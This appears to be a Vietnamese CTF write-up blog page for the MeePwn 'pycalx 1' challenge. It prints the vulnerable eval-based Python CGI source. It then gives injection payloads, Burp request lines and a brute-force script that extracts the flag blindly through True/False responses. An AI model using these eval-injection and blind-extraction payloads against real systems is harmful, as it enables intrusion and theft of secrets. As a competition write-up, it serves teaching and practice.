@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hugo Theme  | Meepwn qual round - pycalx 1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css" />
+    <link rel="stylesheet" href="https://hungry-visvesvaraya-d246d6.netlify.com/css/blog.css" />
+    
+</head>
+<body>
+
+    
+    <nav class="navbar is-fixed-top" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/">Home</a>
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/about">About</a>
+        </div>
+    </nav>
+    
+
+    
+    <section class="hero is-info is-medium">
+        <div class="hero-body" style="background-image: url(https://hungry-visvesvaraya-d246d6.netlify.com/img/bg-blog.jpg);">
+            <div class="container has-text-centered">
+                <br>
+                <h1 class="title is-size-1">
+                    
+                        Meepwn qual round - pycalx 1
+                    
+                </h1>
+                
+            </div>
+        </div>
+    </section>
+
+
+<div class="container">
+    <div class="section">
+    
+
+<div class="columns">
+    <div class="column is-9">
+        <div class="tile is-child box">
+            <div class="content">
+                <p>Thử thách cung cấp cho mình 1 form dữ liệu cùng với sourcecode như sau:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">import</span> cgi;
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> html <span style="color:#66d9ef">import</span> escape
+
+FLAG <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;/var/www/flag&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()
+
+OK_200 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;Content-type: text/html
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;link rel=&#34;stylesheet&#34; href=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;&gt;
+</span><span style="color:#e6db74">&lt;center&gt;
+</span><span style="color:#e6db74">&lt;title&gt;PyCalx&lt;/title&gt;
+</span><span style="color:#e6db74">&lt;h1&gt;PyCalx&lt;/h1&gt;
+</span><span style="color:#e6db74">&lt;form&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=value1 placeholder=&#39;Value 1 (Example: 1  abc)&#39; autofocus/&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=op placeholder=&#39;Operator (Example: + - * ** / // == != )&#39; /&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=value2 placeholder=&#39;Value 2 (Example: 1  abc)&#39; /&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4 btn btn-success&#34; type=submit value=EVAL /&gt;
+</span><span style="color:#e6db74">&lt;/form&gt;
+</span><span style="color:#e6db74">&lt;a href=&#39;?source=1&#39;&gt;Source&lt;/a&gt;
+</span><span style="color:#e6db74">&lt;/center&gt;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+print(OK_200)
+arguments <span style="color:#f92672">=</span> cgi<span style="color:#f92672">.</span>FieldStorage()
+
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;source&#39;</span> <span style="color:#f92672">in</span> arguments:
+    source <span style="color:#f92672">=</span> arguments[<span style="color:#e6db74">&#39;source&#39;</span>]<span style="color:#f92672">.</span>value
+<span style="color:#66d9ef">else</span>:
+    source <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#66d9ef">if</span> source <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+    print(<span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">+</span>escape(str(open(__file__,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>)
+
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;value1&#39;</span> <span style="color:#f92672">in</span> arguments <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;value2&#39;</span> <span style="color:#f92672">in</span> arguments <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;op&#39;</span> <span style="color:#f92672">in</span> arguments:
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_value</span>(val):
+        val <span style="color:#f92672">=</span> str(val)[:<span style="color:#ae81ff">64</span>]
+        <span style="color:#66d9ef">if</span> str(val)<span style="color:#f92672">.</span>isdigit(): <span style="color:#66d9ef">return</span> int(val)
+        blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;(&#39;</span>,<span style="color:#e6db74">&#39;)&#39;</span>,<span style="color:#e6db74">&#39;[&#39;</span>,<span style="color:#e6db74">&#39;]&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>] <span style="color:#75715e"># I don&#39;t like tuple, list and dict.</span>
+        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> [c <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> blacklist <span style="color:#66d9ef">if</span> c <span style="color:#f92672">in</span> val] <span style="color:#f92672">!=</span> []:
+            print(<span style="color:#e6db74">&#39;&lt;center&gt;Invalid value&lt;/center&gt;&#39;</span>)
+            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> val
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_op</span>(val):
+        val <span style="color:#f92672">=</span> str(val)[:<span style="color:#ae81ff">2</span>]
+        list_ops <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;-&#39;</span>,<span style="color:#e6db74">&#39;/&#39;</span>,<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;!&#39;</span>]
+        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> val[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> list_ops:
+            print(<span style="color:#e6db74">&#39;&lt;center&gt;Invalid op&lt;/center&gt;&#39;</span>)
+            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> val
+
+    op <span style="color:#f92672">=</span> get_op(arguments[<span style="color:#e6db74">&#39;op&#39;</span>]<span style="color:#f92672">.</span>value)
+    value1 <span style="color:#f92672">=</span> get_value(arguments[<span style="color:#e6db74">&#39;value1&#39;</span>]<span style="color:#f92672">.</span>value)
+    value2 <span style="color:#f92672">=</span> get_value(arguments[<span style="color:#e6db74">&#39;value2&#39;</span>]<span style="color:#f92672">.</span>value)
+
+    <span style="color:#66d9ef">if</span> str(value1)<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">^</span> str(value2)<span style="color:#f92672">.</span>isdigit():
+        print(<span style="color:#e6db74">&#39;&lt;center&gt;Types of the values don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t match&lt;/center&gt;&#39;</span>)
+        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+
+    calc_eval <span style="color:#f92672">=</span> str(repr(value1)) <span style="color:#f92672">+</span> str(op) <span style="color:#f92672">+</span> str(repr(value2))
+
+    print(<span style="color:#e6db74">&#39;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&#34;col-md-8&#34;&gt;&lt;pre&gt;&#39;</span>)
+    print(<span style="color:#e6db74">&#39;&gt;&gt;&gt;&gt; print(&#39;</span><span style="color:#f92672">+</span>escape(calc_eval)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;)&#39;</span>)
+
+    <span style="color:#66d9ef">try</span>:
+        result <span style="color:#f92672">=</span> str(eval(calc_eval))
+        <span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span> <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;False&#39;</span>:
+            print(result)
+        <span style="color:#66d9ef">else</span>:
+            print(<span style="color:#e6db74">&#34;Invalid&#34;</span>) <span style="color:#75715e"># Sorry we don&#39;t support output as a string due to security issue.</span>
+    <span style="color:#66d9ef">except</span>:
+        print(<span style="color:#e6db74">&#34;Invalid&#34;</span>)
+
+
+    print(<span style="color:#e6db74">&#39;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#39;</span>)</code></pre></div>
+
+<p>Server nhận dữ liệu ở 3 biến: <code>value1</code>, <code>value2</code> và <code>op</code>. Cả 3 biến đều bị filter, chức năng là thực hiện phép tính nhập từ người dùng.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;aa&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;bbb&#39;</span>)
+Invalid
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+<span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#ae81ff">1111</span><span style="color:#f92672">*</span><span style="color:#ae81ff">222</span>)
+<span style="color:#ae81ff">246642</span></code></pre></div>
+
+<p>Mục đích rất rõ ràng, phải tìm cách để gọi biến Flag ra, nhưng xem code ở dòng này thì chương trình đã chặn output (tức là dạng blind).</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span> <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;False&#39;</span>:
+    <span style="color:#66d9ef">print</span>(result)
+<span style="color:#66d9ef">else</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid&#34;</span>)</code></pre></div>
+
+<p>Khi rà soát lại code, mình phát hiện code có 1 điểm hơi lạ, ở function <code>get_op(val)</code> nhận độ dài biến val tận 2 kí tự nhưng chỉ filter đúng kí tự đầu, nên mình nghĩ ra cách để break dấu <code>'</code> chèn biến <code>FLAG</code> vào, đồng thời thực hiện so sánh để nhận giá trị <code>True</code>, <code>False</code>.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">&lt;</span>FLAG<span style="color:#75715e">#&#39;)</span>
+False</code></pre></div>
+
+<p>Có vẻ đi đúng hướng, được biết trước là flag có dạng <code>MeePwnCTF{}</code> tiếp theo mình test thế này:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;L&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">&gt;</span>FLAG<span style="color:#75715e">#&#39;)</span>
+False
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+<span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;M&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">&gt;</span>FLAG<span style="color:#75715e">#&#39;)</span>
+False
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+<span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;N&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">&gt;</span>FLAG<span style="color:#75715e">#&#39;)</span>
+True</code></pre></div>
+
+<p>Test theo bảng chữ <code>printable</code> từ đầu đến khi gặp response trả về là <code>True</code> và lấy kí tự trước đó:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#75715e"># python 3.6</span>
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> urllib.parse <span style="color:#66d9ef">import</span> quote_plus
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://178.128.96.203/cgi-bin/server.py?value1=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&amp;op=%2B%27&amp;value2=</span><span style="color:#e6db74">%3E</span><span style="color:#e6db74">FLAG%23&#34;</span>
+wordlist <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>printable[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>])
+wordlist<span style="color:#f92672">.</span>sort()
+temp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;MeePwnCTF{&#34;</span>
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+	<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> wordlist:
+		sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(temp)
+		sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+		r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">.</span>format(quote_plus(flag<span style="color:#f92672">+</span>char)))
+		<span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;True&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text):
+			flag <span style="color:#f92672">+=</span> temp
+			<span style="color:#66d9ef">break</span>
+		temp <span style="color:#f92672">=</span> char
+		sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>)</code></pre></div>
+
+<p>Flag chạy tới đoạn <code>MeePwnCTF{python3.66666666666666_</code> thì bị lỗi. Có anh trong team bảo là do trong flag có kí tự bị chặn <code>[]()'&quot;</code> nên không chạy tiếp được nữa. Lúc này mình tưởng ra flag rồi, ai ngờ …..đành tính cách khác. Suy nghĩ hơi lâu không tìm ra được cách nào để gửi lên kí tự bị chặn đấy nhưng mình có kế tạm thời là đoán tất cả những kí tự không bị chặn nhưng chưa tìm ra, ví dụ <code>MeePwnCTF{python3.66666666666666_*[][][][][]*xxxxxxxxx}</code> mình có thể tìm được kí tự xxxx đó mà không cần biết kí tự đặc biệt. Payload mình build như sau:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Mee&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">in</span> FLAG<span style="color:#75715e">#&#39;)</span>
+True
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+<span style="color:#f92672">&gt;&gt;&gt;&gt;</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;}&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">in</span> FLAG<span style="color:#75715e">#&#39;)</span>
+True</code></pre></div>
+
+<p>Sourcecode trước không dùng được nữa nên mình dùng burp suite intruder thay thế (mất thời gian quá <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/ah.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/>)</p>
+
+<pre><code>GET /cgi-bin/server.py?value1=§_§&amp;op=%2B%27&amp;value2=%20in%20FLAG%23 HTTP/1.1  =&gt; Tìm tất cả kí tự có trong FLAG
+</code></pre>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/meepwn.png" width="100%"/> <figcaption>
+            <h4>Burpsuite intruder</h4>
+        </figcaption>
+</figure>
+
+
+<p>Tiếp đó, mình sẽ đoán cụm từ trong flag</p>
+
+<pre><code>GET /cgi-bin/server.py?value1=§_§a&amp;op=%2B%27&amp;value2=%20in%20FLAG%23 HTTP/1.1  =&gt; Tìm kí tự đứng trước a
+GET /cgi-bin/server.py?value1=a§_§&amp;op=%2B%27&amp;value2=%20in%20FLAG%23 HTTP/1.1  =&gt; Tìm kí tự đứng sau a
+</code></pre>
+
+<p>Cứ như thế đến hết danh sách kí tự tìm được thì mình tìm được 80% flag như là <code>MeePwnCTF{python3.66666666666666_*you_passed_this?*}</code> dấu * là kí tự đặc biệt. Sau khi làm xong bước này thì anh trong team quăng cho payload:</p>
+
+<pre><code>http://178.128.96.203/cgi-bin/server.py
+?value1=M
+&amp;op=%2B%27
+&amp;value2= %2b source &lt; FLAG%23
+&amp;source=e
+&gt;&gt;&gt;&gt; print('M'+'' + source &lt; FLAG#')
+True
+</code></pre>
+
+<p>Vậy là xong, biến source không bị filter nên thoải mái mà inject. Payload cuối cùng là thế này:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#75715e"># Python 3.6</span>
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> urllib.parse <span style="color:#66d9ef">import</span> quote_plus
+<span style="color:#75715e"># url = &#34;http://178.128.96.203/cgi-bin/server.py?value1={}&amp;op=%2B%27&amp;value2=%3EFLAG%23&#34;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://178.128.96.203/cgi-bin/server.py?value1=MeePwnCTF%7bpython3.66666666666666_&amp;op=%2B%27&amp;value2=</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">2b</span><span style="color:#e6db74">%20s</span><span style="color:#e6db74">ource</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">3E</span><span style="color:#e6db74">%20F</span><span style="color:#e6db74">LAG%23&amp;source=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>
+wordlist <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>printable[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>])
+wordlist<span style="color:#f92672">.</span>sort()
+temp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;MeePwnCTF{python3.66666666666666_&#34;</span>)
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+	<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> wordlist:
+		sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(temp)
+		sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+		r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">.</span>format(quote_plus(flag<span style="color:#f92672">+</span>char)))
+		<span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;True&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text):
+			flag <span style="color:#f92672">+=</span> temp
+			<span style="color:#66d9ef">break</span>
+		temp <span style="color:#f92672">=</span> char
+		sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>)</code></pre></div>
+
+<p>FLAG: <code>MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])}</code></p>
+
+            </div>
+        </div>
+    </div>
+    <div class="column is-3">
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Tags</h1>
+        <div class="tags">
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/ctf">ctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/cve">cve</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/flask">flask</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/laravel">laravel</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/matesctf">matesctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/php">php</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/python">python</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/serialization">serialization</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-2018">svattt-2018</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-final-2018">svattt-final-2018</a></span>
+        
+        </div>          
+    </div>
+</div><br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Recent posts</h1>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/new_year_2019/">New year 2019</a></h1>
+            <time class="has-text-grey-light is-size-7">1 January 2019</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/laravel-object-injection-to-rce/">Laravel object injection to RCE</a></h1>
+            <time class="has-text-grey-light is-size-7">25 October 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/php_object_injection_without_unserialize/">Php Object Injection Without Unserialize</a></h1>
+            <time class="has-text-grey-light is-size-7">20 September 2018</time>
+        
+    </div>
+</div>
+    <br>
+                
+  
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Related posts</h1>
+      
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf-final-2-brute-mongodb-_id/">Matesctf final 2 - Brute mongodb _id</a></h1>
+            <time class="has-text-grey-light is-size-7">13 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_rce/">Matesctf final 2 - IP Spoofing to RCE in flask</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_ssti/">Matesctf final 2 - SSTI</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_xxe/">Matesctf final 2 - XXE Injection</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+    </div>
+</div>
+
+    
+<br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Archives</h1>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2019">2019</a> (1)<br>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2018">2018</a> (9)<br>
+        
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+</div>
+
+
+<script>
+
+
+
+
+var disqus_config = function () {
+this.page.url = "https:\/\/hungry-visvesvaraya-d246d6.netlify.com\/";  
+this.page.identifier = "blog-kev"; 
+};
+
+(function() { 
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-kev.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+
+<footer class="footer has-background-grey-darker has-text-white">
+    <div class="content has-text-centered">
+        <p>
+            <span class="icon is-large"><a href="https://twitter.com/" class="mysocial"><i class="fab fa-twitter fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://www.youtube.com/" class="mysocial"><i class="fab fa-youtube fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://github.com/" class="mysocial"><i class="fab fa-github fa-3x"></i></a></span>&nbsp;&nbsp;
+            <br><br>
+            Copyright &copy; Hugo Theme 2019</a>
+        </p>
+    </div>
+</footer>
+
+<script defer src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
+
+<script id="dsq-count-scr" src="//blog-kev.disqus.com/count.js" async></script>
+</body>
+</html>
